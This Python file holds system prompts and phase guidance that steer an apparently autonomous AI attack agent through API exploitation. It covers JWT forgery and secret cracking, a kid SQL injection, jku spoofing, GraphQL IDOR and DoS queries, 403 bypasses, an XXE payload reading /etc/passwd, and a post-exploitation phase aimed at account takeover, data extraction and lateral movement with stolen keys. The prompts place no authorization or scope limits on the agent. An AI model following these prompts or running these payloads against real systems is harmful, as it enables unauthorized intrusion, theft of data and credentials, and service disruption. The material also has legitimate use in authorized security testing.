#!/usr/bin/env python3
"""
VIPER 5.0 API Security Attack Skill Prompts

System prompt and phase guidance for API security testing:
JWT exploitation, GraphQL attacks, REST API vulnerabilities,
403/401 bypass, OAuth/OIDC attack patterns.
"""


# ---------------------------------------------------------------------------
# Tool list and usage guidance
# ---------------------------------------------------------------------------

API_TOOLS = """\
## API SECURITY TOOLS

| Tool | Purpose | When to Use |
|------|---------|-------------|
| `execute_curl` | Manual HTTP requests | JWT manipulation, GraphQL queries, 403 bypass, IDOR |
| `kali_shell` | Run jwt_tool, graphql-cop, ffuf | Automated JWT attacks, GraphQL audit, API fuzzing |
| `interactsh-client` | OOB callback server | Blind SSRF via API, OOB data exfil |
| `web_search` | Research CVEs and bypass techniques | JWT library CVEs, WAF-specific bypasses |
"""


# ---------------------------------------------------------------------------
# JWT exploitation
# ---------------------------------------------------------------------------

JWT_EXPLOITATION = """\
## JWT EXPLOITATION

### Step 1: JWT Analysis
```
kali_shell("jwt_tool TOKEN_VALUE")
kali_shell("jwt_tool TOKEN_VALUE -M at")    # Full vuln scan
kali_shell("jwt_tool TOKEN_VALUE -C")       # Quick tamper check
```

### Step 2: Algorithm Confusion Attacks

**alg:none (CVE-2015-9235):**
Remove signature requirement entirely. Many JWT libraries accepted "none" algorithm.
```
kali_shell("jwt_tool TOKEN_VALUE -X a")
```

**RS256 to HS256 Key Confusion:**
If server expects RS256 but accepts HS256, use public key as HMAC secret.
First extract public key from `/.well-known/jwks.json`:
```
execute_curl("GET", "https://TARGET/.well-known/jwks.json")
kali_shell("jwt_tool TOKEN_VALUE -X k -pk public_key.pem")
```

**JWK Header Injection (CVE-2018-0114):**
Inject attacker-controlled JWK in token header:
```
kali_shell("jwt_tool TOKEN_VALUE -X i")
```

**JWKS Spoofing:**
Host malicious JWKS and inject jku header:
```
kali_shell("jwt_tool TOKEN_VALUE -X s -ju https://CALLBACK_URL/.well-known/jwks.json")
```

### Step 3: JWT Secret Cracking
```
kali_shell("jwt_tool TOKEN_VALUE -C -d /usr/share/wordlists/rockyou.txt")
```
Common weak secrets: secret, password, 123456, your-256-bit-secret,
secret_key, jwt_secret, api_secret, supersecret, changeme, HS256-secret

### Step 4: JWT Claim Tampering
After cracking the secret:
```
# Escalate role
kali_shell("jwt_tool TOKEN -T -S hs256 -p 'SECRET' -pc role -pv admin")
# IDOR via sub claim
kali_shell("jwt_tool TOKEN -T -S hs256 -p 'SECRET' -pc sub -pv 'ADMIN_USER_ID'")
# Bypass expiration
kali_shell("jwt_tool TOKEN -T -S hs256 -p 'SECRET' -pc exp -pv 9999999999")
# Add admin claim
kali_shell("jwt_tool TOKEN -T -S hs256 -p 'SECRET' -I -pc is_admin -pv true")
```

### Step 5: Advanced JWT Bypasses

**kid Parameter SQL Injection:**
If kid is used in SQL query to fetch key, inject to control the secret:
```
kali_shell("jwt_tool TOKEN -I -hc kid -hv \\"aaa' UNION SELECT 'attacker_secret';--\\"")
```

**kid Path Traversal to /dev/null:**
Sign with empty string by pointing to empty file:
```
kali_shell("jwt_tool TOKEN -I -hc kid -hv '../../../../dev/null' -S hs256 -p ''")
```

**x5u Header Injection:**
Point to attacker-controlled X.509 certificate URL:
```
kali_shell("jwt_tool TOKEN -X s -x5u https://CALLBACK_URL/cert.pem")
```

**Blank Password / Empty Key:**
Some implementations accept empty secrets:
```
kali_shell("jwt_tool TOKEN -T -S hs256 -p ''")
kali_shell("jwt_tool TOKEN -T -S hs384 -p ''")
kali_shell("jwt_tool TOKEN -T -S hs512 -p ''")
```
"""


# ---------------------------------------------------------------------------
# GraphQL exploitation
# ---------------------------------------------------------------------------

GRAPHQL_EXPLOITATION = """\
## GRAPHQL EXPLOITATION

### Step 1: GraphQL Detection & Introspection
```
kali_shell("graphql-cop -t https://TARGET/graphql")
kali_shell("graphql-cop -t https://TARGET/graphql -H '{\\"Authorization\\": \\"Bearer TOKEN\\"}'")
```

Check for introspection:
```
execute_curl("POST", "https://TARGET/graphql",
    headers={"Content-Type": "application/json"},
    data='{"query": "{ __schema { types { name } } }"}')
```

### Step 2: Schema Extraction
Full introspection query:
```
execute_curl("POST", "https://TARGET/graphql",
    headers={"Content-Type": "application/json"},
    data='{"query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name } } } } } }"}')
```

### Step 3: GraphQL IDOR Attacks
Enumerate objects across tenants by incrementing IDs:
```graphql
query { object(id: "gid://app/Object/1") { id sensitiveField } }
query { object(id: "gid://app/Object/2") { id sensitiveField } }
```
Test mutations affecting other users' data:
```graphql
mutation { DeleteResource(input: { resourceId: "OTHER_USER_RESOURCE_ID" }) { success } }
mutation { UpdateResource(input: { resourceId: "OTHER_PROGRAM_ID", state: "suspended" }) { success } }
```

### Step 4: GraphQL DoS Patterns

**Batching Attack:** Send array of queries:
```json
[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},...]
```

**Alias Attack:** Multiple aliases in single query:
```graphql
query { a1: user(id:1) { email } a2: user(id:2) { email } ... }
```

**Deep Nesting Attack:** Recursive types cause resource exhaustion:
```graphql
query { user(id:1) { friends { friends { friends { friends { id } } } } } }
```

### Step 5: Introspection Bypass When Disabled

**Probe field suggestions** (GraphQL returns "Did you mean X?" errors):
Common queries to probe: user, users, me, currentUser, viewer, admin, order, payment, secret, config

**Special character bypass:**
```
{ __schema%0a{ types { name } } }
{ __schema%20{ types { name } } }
{ __schema%09{ types { name } } }
```

**WebSocket introspection** (HTTP blocked, WS allowed):
```
websocat wss://TARGET/graphql-ws
{"type":"start","id":"1","payload":{"query":"{ __schema { types { name } } }"}}
```

**GET instead of POST:**
```
execute_curl("GET", "https://TARGET/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D")
```

**Clairvoyance schema recovery:**
```
kali_shell("clairvoyance https://TARGET/graphql -o schema.json -w /usr/share/seclists/Discovery/Web-Content/graphql-fields.txt")
```
"""


# ---------------------------------------------------------------------------
# REST API attacks / 403 bypass
# ---------------------------------------------------------------------------

REST_API_ATTACKS = """\
## REST API ATTACKS

### 403/401 Bypass Techniques

**Header Injection:**
```
execute_curl("GET", "https://TARGET/anything", headers={"X-Original-URL": "/admin"})
execute_curl("GET", "https://TARGET/anything", headers={"X-Rewrite-URL": "/admin"})
```

**IP Spoofing Headers:**
Test each of these headers with value `127.0.0.1`:
X-Forwarded-For, X-Real-IP, X-Originating-IP, X-Remote-IP, X-Remote-Addr,
X-Client-IP, X-Host (localhost), Forwarded: for=127.0.0.1

**Path Manipulation:**
```
/api/admin/users/../users      # Path traversal
/api/admin//users              # Double slash
/api/admin/./users             # Current dir
/api/admin/users/              # Trailing slash
/api/admin/users%2f            # URL-encoded slash
/api/admin/users%00            # Null byte
/api/admin/users..;/           # Spring bypass
/api/admin/users;.css          # Extension bypass
/api/admin/users?              # Query string
```

**Case & Encoding Variations:**
```
/api/ADMIN/users               # Case sensitivity
/api/%61dmin/users             # URL-encoded 'a'
/api/%2561dmin/users           # Double encoding
```

**HTTP Method Override:**
```
execute_curl("POST", "https://TARGET/api/admin", headers={"X-HTTP-Method-Override": "GET"})
```
Test all methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE

**Referer & Origin Manipulation:**
```
execute_curl("GET", "https://TARGET/api/admin", headers={"Referer": "https://TARGET/admin"})
execute_curl("GET", "https://TARGET/api/admin", headers={"Referer": "https://localhost"})
```

### BOLA/IDOR Testing
Sequential ID enumeration with authorization tokens.
Check for UUID predictability patterns.
Test horizontal privilege escalation (user A accessing user B resources).

### Mass Assignment
Add privileged fields in create/update requests:
```json
{"username": "test", "email": "test@test.com", "role": "admin",
 "isAdmin": true, "verified": true, "permissions": ["*"]}
```

### API Versioning Bypass
Find older, less secure API versions:
```
kali_shell("ffuf -u 'https://TARGET/api/vFUZZ/users' -w <(seq 1 10) -mc 200,301,302")
```
Try: /api/v1/admin, /api/beta/admin, /api/internal/admin
"""


# ---------------------------------------------------------------------------
# API fuzzing
# ---------------------------------------------------------------------------

API_FUZZING = """\
## API FUZZING

### Parameter Discovery
```
kali_shell("ffuf -u 'https://TARGET/api/users?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 0")
```

### JSON Body Parameter Fuzzing
```
kali_shell("ffuf -u 'https://TARGET/api/user' -X POST -H 'Content-Type: application/json' -d '{\"FUZZ\": \"test\"}' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt")
```

### Endpoint Discovery
```
kali_shell("ffuf -u 'https://TARGET/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,301,302,401,403,405")
```
"""


# ---------------------------------------------------------------------------
# Advanced techniques
# ---------------------------------------------------------------------------

ADVANCED_API_TECHNIQUES = """\
## ADVANCED API TECHNIQUES

### Rate Limit Bypass
Rotate IP spoofing headers across requests to bypass per-IP rate limits.

### Content-Type Manipulation
Switch JSON to XML to test for XXE:
```
execute_curl("POST", "https://TARGET/api/user",
    headers={"Content-Type": "application/xml"},
    data='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>')
```

### WAF Bypass Techniques
- HTTP Parameter Pollution: `?id=1&id=admin`
- Chunked Transfer Encoding bypass
- Content-Type charset confusion: `application/json; charset=utf-7`
- Null byte injection: `/api/admin%00.json`
- Unicode normalization: fullwidth characters

### OAuth/OIDC Attack Patterns
- Open redirect in redirect_uri
- Path traversal in redirect_uri
- Fragment injection for token theft
- State parameter CSRF (predictable/missing state)
- Scope escalation via parameter manipulation

### API Key/Token Extraction
Check JavaScript files for hardcoded secrets:
```
execute_curl("GET", "https://TARGET/main.js")
```
Grep for: api[_-]?key, apikey, secret, token, jwt, bearer, auth

Check exposed config files: /.env, /.env.local, /.env.production,
/config.json, /settings.json, /main.js.map
"""


# ---------------------------------------------------------------------------
# Assembled system prompt
# ---------------------------------------------------------------------------

SYSTEM_PROMPT = f"""\
## ATTACK SKILL: API SECURITY TESTING

**This attack has been CLASSIFIED as API security testing.**
Follow the API security workflow below, covering JWT, GraphQL, REST API,
and authentication bypass testing as applicable to the target.

{API_TOOLS}

{JWT_EXPLOITATION}

{GRAPHQL_EXPLOITATION}

{REST_API_ATTACKS}

{API_FUZZING}

{ADVANCED_API_TECHNIQUES}

## OWASP API SECURITY TOP 10 (2023) CHECKLIST

| # | Vulnerability | Test Method |
|---|---------------|-------------|
| API1 | Broken Object Level Auth | IDOR testing with ID enumeration |
| API2 | Broken Authentication | JWT attacks, credential stuffing |
| API3 | Broken Object Property Auth | Mass assignment testing |
| API4 | Unrestricted Resource Consumption | Rate limit bypass, batching |
| API5 | Broken Function Level Auth | Privilege escalation via method/path |
| API6 | Unrestricted Access to Sensitive Flows | Business logic abuse |
| API7 | Server-Side Request Forgery | SSRF payloads via API params |
| API8 | Security Misconfiguration | Introspection, debug endpoints |
| API9 | Improper Inventory Management | API version fuzzing |
| API10 | Unsafe Consumption of APIs | Third-party trust abuse |
"""


# ---------------------------------------------------------------------------
# Phase guidance
# ---------------------------------------------------------------------------

def get_phase_guidance(phase: str) -> str:
    """Get phase-specific guidance for API security testing."""
    if phase == "informational":
        return """\
## API SECURITY -- INFORMATIONAL PHASE

Focus on:
1. Identify all API endpoints (REST, GraphQL, WebSocket)
2. Discover API documentation (Swagger, OpenAPI, GraphQL introspection)
3. Fingerprint authentication mechanism (JWT, OAuth, API key, session)
4. Map all input vectors: URL params, JSON body, headers, cookies
5. Detect WAF/rate limiting presence

Do NOT attempt exploitation yet. Gather intelligence first.
Transition to exploitation phase when you have mapped the API surface."""

    elif phase == "exploitation":
        return """\
## API SECURITY -- EXPLOITATION PHASE

Execute the API security workflow:
1. If JWT auth: run jwt_tool full scan, test alg confusion, crack secrets
2. If GraphQL: run graphql-cop, test introspection, IDOR, DoS patterns
3. Test 403/401 bypass techniques (headers, paths, methods, encoding)
4. Test BOLA/IDOR with sequential and predictable IDs
5. Test mass assignment on create/update endpoints
6. Fuzz for hidden parameters and endpoints
7. Test rate limit bypass, content-type manipulation
8. Test OAuth/OIDC flows if present

After confirmed exploitation, transition to post_exploitation."""

    elif phase == "post_exploitation":
        return """\
## API SECURITY -- POST-EXPLOITATION PHASE

Confirmed API vulnerability. Focus on:
1. Escalation: chain JWT bypass + IDOR for full account takeover
2. Data extraction scope: what sensitive data is accessible?
3. Privilege mapping: what admin functions are reachable?
4. Evidence collection: save all requests/responses, JWT tokens
5. Impact assessment: PII exposure, financial data, admin access
6. Check for lateral movement via stolen API keys/tokens"""

    return ""
